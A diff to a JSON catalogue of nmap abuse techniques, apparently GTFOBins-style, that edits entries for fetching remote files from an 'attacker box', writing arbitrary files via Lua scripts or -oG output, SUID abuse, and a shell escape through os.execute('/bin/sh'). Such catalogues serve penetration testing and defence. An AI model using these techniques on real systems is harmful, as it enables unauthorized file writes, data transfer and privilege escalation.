@@ -35,7 +35,7 @@
     "file-download": [
       {
         "description": "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., 'php -S 0.0.0.0:8080'. Note that multiple connections are made to the server and the result is placed in '$TF/IP/PORT/PATH'. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
-        "code": "nmap -p [port] [host] --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=[file]\n"
+        "code": "TF=$(mktemp -d)\nnmap -p [port] [host] --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=[file]\n"
       },
       {
         "description": "Fetch a remote file via TCP. Run 'nc [host] [port] < [file]' on the attacker box to send the file.",
@@ -44,7 +44,11 @@
     ],
     "file-write": [
       {
-        "code": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"[file]\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n"
+        "code": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"[file]\", \"wb\"); f:write(\"[data]\"); io.close(f);' > $TF\nnmap --script=$TF\n"
+      },
+      {
+        "description": "The payload appears inside the regular nmap output.",
+        "code": "nmap -oG=[file] [data]\n"
       }
     ],
     "file-read": [
@@ -66,6 +70,12 @@
       {
         "description": "Input echo is disabled.",
         "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "The payload appears inside the regular nmap output.",
+        "code": "./nmap -oG=[file] [data]\n"
       }
     ]
   }
